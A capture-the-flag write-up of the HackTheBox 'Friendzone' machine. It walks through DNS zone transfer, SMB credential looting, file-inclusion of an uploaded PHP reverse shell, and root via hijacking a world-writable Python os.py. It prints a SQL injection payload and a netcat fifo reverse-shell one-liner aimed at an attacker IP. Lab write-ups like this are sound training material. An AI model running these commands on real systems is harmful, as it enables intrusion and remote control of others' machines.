---
title: "Friendzone"
description: "Writeup for Friendzone machine from HTB"
date: 2020-09-06
lastmod: 2020-09-06
author: "Pablo Jesús González Rubio"
cover: "friendzone.png"
coverAlt: "Friendzone icon"
toc: true
tags: [ "Writeup" ]
---

> `fast-nmap` and `gobusterdefault` are aliases from [this gist](https://gist.github.com/n0nuser/34fc14a084436ae89c2b3405ad453f0a)

## Scanning

I've put the machine IP in `/etc/hosts` for easy access:

```
10.10.10.123 friendzone.htb
```

Then I've run my alias for nmap:

```
fast-nmap friendzone.htb
```

Output:

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/ssl     Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -58m01s, deviation: 1h43m54s, median: 1m57s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-09-06T19:01:27+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-06T16:01:27
|_  start_date: N/A
```

It seems to have lots of ports open!

Summaring: **21**, **22**, **53**, **80**, **139**, **443**, **445**

## Enumeration

In port **21** we have FTP with service *vsftpd 3.0.3*, which doesn't show to have anonymous access and the version hasn't any vulnerability itself, so let's carry with port **80** (HTTP) as it can give us substantial information.

{{< img "HTTP.png" "HTTP" "border" >}}

Running gobuster (`gobusterdefault friendzone.htb`) list these directories:

```
/icons/ (Status: 403)
/wordpress/ (Status: 200)
/server-status/ (Status: 403)
```

The `wordpress` directory is empty so let's try poking the DNS port (53) doing a Domain Transfer with the URL from the email in the webpage to list all the subdomains:

```
dig axfr @10.10.10.123 friendzoneportal.red
```

It outputs:

```
; <<>> DiG 9.16.4-Debian <<>> axfr @10.10.10.123 friendzoneportal.red
; (1 server found)
;; global options: +cmd
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.	604800	IN	AAAA	::1
friendzoneportal.red.	604800	IN	NS	localhost.
friendzoneportal.red.	604800	IN	A	127.0.0.1
admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
files.friendzoneportal.red. 604800 IN	A	127.0.0.1
imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 47 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: dom sep 06 18:15:49 CEST 2020
;; XFR size: 9 records (messages 1, bytes 309)
```

Yay! We have found some subdomains:

- admin.friendzoneportal.red
- files.friendzoneportal.red
- imports.friendzoneportal.red
- vpn.friendzoneportal.red

Let's try again with `friendzone.red`:

```
; <<>> DiG 9.16.4-Debian <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 43 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: dom sep 06 19:11:08 CEST 2020
;; XFR size: 8 records (messages 1, bytes 289)
```

More subdomains:

- administrator1.friendzone.red
- hr.friendzone.red
- uploads.friendzone.red

Let's add them to `/etc/hosts`!

```
10.10.10.123 friendzone.htb friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
```

This seems like chaos, with that many sites we'll have to go one by one.

The *HTTP* version of all pages are the same, just an image. To discard the bad sites, in the following *HTTPS* urls there's absolutely nothing:

  - `https://friendzone.htb`
  - `https://hr.friendzone.red`
  - `https://files.friendzoneportal.red`
  - `https://imports.friendzoneportal.red`
  - `https://vpn.friendzoneportal.red`

Now with the pages with real content:

- On ***`https://friendzone.red`***:

{{< img "ready.png" "Ready" "border" >}}

In it's source-code:

{{< img "source.png" "Source" "border" >}}

In that directory appears this:

```html
<p>Testing some functions !</p>
<p>I'am trying not to break things !</p>
TzF0dDZTa2oyYTE1OTk0MTI2NTRGM3Q0OFRtcXhG
<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```

When refreshing the page the rare text changes, a bit odd.

- On ***`https://friendzoneportal.red`***:

{{< img "https.png" "HTTPS" "border" >}}

- On ***`https://admin.friendzoneportal.red`***:

{{< img "admin.png" "Admin" "border" >}}

Let's try the usual default username & password:

```sql
admin
```

It returns:

```
Admin page is not developed yet !!! check for another one
```

- On ***`https://administrator1.friendzone.red`***:

{{< img "administrator.png" "Administrator" "border" >}}

Let's try some SQLi:

```sql
admin' or '1'='1
```

The portal doesn't let us in. Maybe we have to come here later.

- On ***`https://uploads.friendzone.red`***:

{{< img "upload.png" "Upload" "border" >}}

Summarizing a little bit the things that matter: we have an admin page, an upload page, and an odd text generator.

Let's keep poking ports to check if we can get the creds for the admin page.

Now we have the Samba shares:

```
smbmap -H 10.10.10.123 -R
```

{{< img "samba2.png" "Samba" "border">}}

So there's a `creds.txt` file with potential passwords. To grab it:

```
smbclient //friendzone.htb/general/ -N
get creds.txt
```

{{< img "creds.png" "Credentials" "border" >}}

That file contains: `admin:WORKWORKHhallelujah@#`

Trying them with FTP or Samba didn't work, but it did work with the admin panel we've found before:

```
Login Done ! visit /dashboard.php
```

{{< img "dashboard.png" "Dashboard" "border" >}}

Mixing what we have, it **may** be a combination of uploading something to the page, getting the timestamp with the rare text generator, and watching something happen in the admin page. Let's see!

I uploaded the `Dali` icon from LaCasaDePapel HTB machine and this timestamp appeared:

```
Uploaded successfully !
1599417981
```

On admin page:

{{< img "timestamp.png" "TimeStamp" "border" >}}

May be with the original `a.jpg` and the final access timestamp:

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=1599418070
```

{{< img "haha.png" "Haha" "border">}}

Still in the friendzone 😭

Trying to figure out what the page does I found out that the `pagename` parameter loads a PHP file. In this case, `timestamp.php`, which is on `https://administrator1.friendzone.red/timestamp.php`.

Looking back at the read/write access on the Samba share `Development`, we can try to upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and load it via the URL. As `Files` share is served on `/etc/Files`, I assumed `Development` was in `/etc/Development`.

Uploading the shell:

{{< img "shell.png" "Reverse Shell" "border" >}}

Loading the page creates the reverse shell:

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```

And listening with netcat...

{{< img "wwwdata.png" "WWW-Data" >}}

Let's upgrade the shell to a [TTY](https://nonuser.es/posts/pentest_cheatsheet/#tty).

I was curious at how did the creator had so many subdomains:

`/etc/apache2/sites-available/000-default.conf`:

```conf
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

<VirtualHost _default_:443>
    ServerAdmin admin@example.com
    #ServerName www.example.com
    #ServerAlias example.com

    DocumentRoot /var/www/html1

    SSLEngine on
    SSLCertificateFile /root/certs/friendzone.red.crt
    SSLCertificateKeyFile /root/certs/friendzone.red.key

</VirtualHost>

<VirtualHost _default_:443>
    ServerAdmin admin@example.com
    ServerName friendzone.red
    ServerAlias friendzone.red 

    DocumentRoot /var/www/friendzone

    SSLEngine on
    SSLCertificateFile /root/certs/friendzone.red.crt
    SSLCertificateKeyFile /root/certs/friendzone.red.key
</VirtualHost>

<VirtualHost _default_:443>
    ServerAdmin admin@example.com
    ServerName uploads.friendzone.red
    ServerAlias uploads.friendzone.red

    DocumentRoot /var/www/uploads

    SSLEngine on
    SSLCertificateFile /root/certs/friendzone.red.crt
    SSLCertificateKeyFile /root/certs/friendzone.red.key
</VirtualHost>

<VirtualHost _default_:443>
    ServerAdmin admin@example.com
    ServerName administrator1.friendzone.red
    ServerAlias administrator1.friendzone.red

    DocumentRoot /var/www/admin

    SSLEngine on
    SSLCertificateFile /root/certs/friendzone.red.crt
    SSLCertificateKeyFile /root/certs/friendzone.red.key
</VirtualHost>

<VirtualHost _default_:443>
    ServerAdmin admin@example.com
    ServerName friendzoneportal.red
    ServerAlias friendzoneportal.red

    DocumentRoot /var/www/friendzoneportal

    SSLEngine on
    SSLCertificateFile /root/certs/friendzone.red.crt
    SSLCertificateKeyFile /root/certs/friendzone.red.key
</VirtualHost>

<VirtualHost _default_:443>
    ServerAdmin admin@example.com

    ServerName admin.friendzoneportal.red
    ServerAlias admin.friendzoneportal.red

    DocumentRoot /var/www/friendzoneportaladmin

    SSLEngine on
    SSLCertificateFile /root/certs/friendzone.red.crt
    SSLCertificateKeyFile /root/certs/friendzone.red.key
</VirtualHost>
```

Searching in `/var/www`:

```
www-data@FriendZone:/$ cd var/www/
www-data@FriendZone:/var/www$ ls
admin	    friendzoneportal	   html		    uploads
friendzone  friendzoneportaladmin  mysql_data.conf
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/var/www$
```

OMG, there are 6 folders!!

Apart from that, we've got creds for a MySQL database, yay!

Also, we can read `/home/friend/user.txt` and there's no `.ssh` nor other users, so all we have to do from here is privesc to `friend` and from there to `root`.

## Privilege Escalation

### Friend

Taking into account we have creds for a database, let's try to dump it:

```
mysqldump FZ -u friend -pAgpyu12!0.213$
```

My bad, MySQLDump is not installed, and there's no SQL client like MariaDB.

Maybe the creds are for SSH as it's open:

{{< img "ssh.png" "SSH" "border" >}}

Yay!

### Root

I uploaded [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to check for patterns.

{{< img "linpeas.png" "LinPeas" "border" >}}

The only thing I found useful while reading the entire output was that `cron` was running, so maybe it's time to upload `pspy` and check for events.

```
./pspy64 | grep "UID=0"
```

{{< img "pspy.png" "PSPY" "border" >}}

There's a python script running in a cron every 2 minutes but we can't modify it (don't have write permissions) nor replace it (don't have folder write permissions):

{{< img "reporter.png" "Reporter" >}}

The script itself is just importing the `os` library and printing text, nothing more. What we can do here is Python Library Hijacking.

In short terms, is just modifying/replacing a library to trick the script to do what we want, much like the Path Hijacking.

When we don't know where's something we can search for it using `find` and `grep` like this:

```
find / 2>/dev/null | grep os.py
```

Which outputs:

```
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/os.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
```

The script is being run with `python` (not *python3*) so it's version `2.7`.

{{< img "os.png" "OS" "border" >}}

Wow! The library is world-writable, which is pretty weird. We can put a reverse shell in the library and the next time the script executes our shell will be triggered.

To Hijack the library we just have to add at the end of `os.py`:

```python
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 3333 >/tmp/f")
```

And listening with netcat...

{{< img "root.png" "Root!" "border" >}}

Rooted! 🔓️